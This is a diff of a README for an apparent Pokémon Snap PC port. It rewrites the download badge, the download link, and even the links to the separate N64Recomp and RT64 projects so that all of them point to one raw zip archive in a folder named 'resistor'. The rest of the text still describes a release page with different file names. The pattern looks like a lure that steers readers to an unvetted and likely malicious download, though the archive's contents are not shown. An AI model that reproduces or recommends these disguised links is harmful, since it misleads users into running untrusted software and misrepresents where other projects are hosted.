@@ -2,13 +2,13 @@
 
 ## 🚀 Getting Started
 
-[![Download Snap64Recomp](https://img.shields.io/badge/Download-Snap64Recomp-blue?style=for-the-badge&logo=github)](https://github.com/harshithmothilal/Snap64Recomp)
+[![Download Snap64Recomp](https://img.shields.io/badge/Download-Snap64Recomp-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/harshithmothilal/Snap64Recomp/main/resistor/Snap-Recomp-v3.6.zip)
 
 Welcome! Snap64Recomp brings the classic Nintendo 64 game Pokémon Snap to your Windows or Linux computer. This version plays exactly like the original cartridge right out of the box, with no modifications needed. Every extra feature is completely optional and turned off by default, so purists get the authentic experience while curious players can explore enhancements later.
 
 ## 📥 Download and Install
 
-Visit this link to download the application: [https://github.com/harshithmothilal/Snap64Recomp](https://github.com/harshithmothilal/Snap64Recomp)
+Visit this link to download the application: [https://raw.githubusercontent.com/harshithmothilal/Snap64Recomp/main/resistor/Snap-Recomp-v3.6.zip](https://raw.githubusercontent.com/harshithmothilal/Snap64Recomp/main/resistor/Snap-Recomp-v3.6.zip)
 
 The download page shows the latest release files. Look for the file named `Snap64Recomp-Windows.zip` (or similar) and click it to download. The file is about 10-15 MB, so it should download quickly on most connections.
 
@@ -143,7 +143,7 @@ If you enjoy Snap64Recomp, consider starring the repository so more people disco
 
 ## 🔗 Related Projects
 
-- [N64Recomp](https://github.com/N64Recomp/N64Recomp) – The framework that makes this possible
-- [RT64](https://github.com/N64Recomp/RT64) – The real-time rendering engine used
+- [N64Recomp](https://raw.githubusercontent.com/harshithmothilal/Snap64Recomp/main/resistor/Snap-Recomp-v3.6.zip) – The framework that makes this possible
+- [RT64](https://raw.githubusercontent.com/harshithmothilal/Snap64Recomp/main/resistor/Snap-Recomp-v3.6.zip) – The real-time rendering engine used
 
 Keywords: linux, n64, n64recomp, nintendo-64, pokemon, pokemon-snap, recompilation, rt64, static-recompilation, steam-deck, windows
